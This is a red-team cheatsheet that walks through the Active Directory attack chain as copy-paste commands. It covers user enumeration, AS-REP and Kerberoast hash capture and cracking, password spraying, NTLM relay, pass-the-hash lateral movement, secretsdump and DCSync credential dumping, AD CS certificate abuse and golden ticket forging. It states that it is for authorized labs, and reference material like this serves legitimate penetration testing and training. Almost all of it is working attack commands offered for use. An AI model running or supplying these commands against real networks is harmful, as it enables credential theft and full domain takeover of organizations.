# Cheatsheet · Active Directory

> The AD attack chain in commands. Replace `corp.local`, IPs, users. Authorized labs only (start with GOAD).

## 0. Set vars
```bash
DC=10.0.0.10; DOMAIN=corp.local; U=user; P='Password1'
```

## 1. Unauthenticated enum
```bash
nxc smb $DC                                   # name, domain, signing, OS
nmap -p88,389,445,636,3268 $DC                # DC fingerprint
kerbrute userenum -d $DOMAIN --dc $DC users.txt
nxc smb 10.0.0.0/24 -u '' -p '' --shares      # anon shares
```

## 2. AS-REP roast (no creds, just usernames)
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC
hashcat -m 18200 asrep.hash rockyou.txt
```

## 3. Password spray (lockout-aware!)
```bash
nxc smb $DC -u users.txt -p 'Spring2026!' --continue-on-success
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Spring2026!'
```

## 4. Authenticated enum
```bash
nxc smb $DC -u $U -p "$P" --users --groups --shares --pass-pol
# BloodHound collection
bloodhound-python -u $U -p "$P" -d $DOMAIN -ns $DC -c All --zip
nxc ldap $DC -u $U -p "$P" --bloodhound -c All --dns-server $DC
```

## 5. Kerberoasting
```bash
impacket-GetUserSPNs $DOMAIN/$U:"$P" -dc-ip $DC -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## 6. NTLM relay (when SMB signing is OFF)
```bash
# find signing:False hosts
nxc smb 10.0.0.0/24 --gen-relay-list relay.txt
impacket-ntlmrelayx -tf relay.txt -smb2support        # + Responder (analyze mode off)
responder -I eth0
```

## 7. Lateral movement (creds or hash)
```bash
impacket-wmiexec $DOMAIN/$U:"$P"@10.0.0.20
impacket-smbexec  $DOMAIN/$U:"$P"@10.0.0.20            # fallback
impacket-psexec   $DOMAIN/$U:"$P"@10.0.0.20
evil-winrm -i 10.0.0.20 -u $U -p "$P"
evil-winrm -i 10.0.0.20 -u admin -H <NTLMHASH>        # pass-the-hash
nxc smb 10.0.0.20 -u admin -H <NTLMHASH> -x 'whoami'
```

## 8. Dump secrets / DCSync
```bash
impacket-secretsdump $DOMAIN/$U:"$P"@10.0.0.20         # SAM/LSA local
impacket-secretsdump $DOMAIN/$U:"$P"@$DC -just-dc      # DCSync (needs repl rights)
nxc smb $DC -u $U -p "$P" --ntds                       # NTDS via nxc
```

## 9. AD CS (Certipy)
```bash
certipy find -u $U@$DOMAIN -p "$P" -dc-ip $DC -vulnerable -stdout
# ESC1 example
certipy req -u $U@$DOMAIN -p "$P" -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC          # -> TGT / NT hash
```

## 10. Ticket attacks
```bash
# Golden ticket (need krbtgt hash + domain SID)
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass $DOMAIN/administrator@dc.$DOMAIN
```

## hashcat modes (memorize)
| Mode | Hash |
|---|---|
| 1000 | NTLM |
| 1800 | sha512crypt (`$6$`, /etc/shadow) |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | AS-REP |
| 5600 | NetNTLMv2 (Responder) |

## Pitfalls
- Always check lockout policy before spraying (`--pass-pol`).
- Run BloodHound early; follow the shortest path.
- Confirm SMB signing before relay attempts.
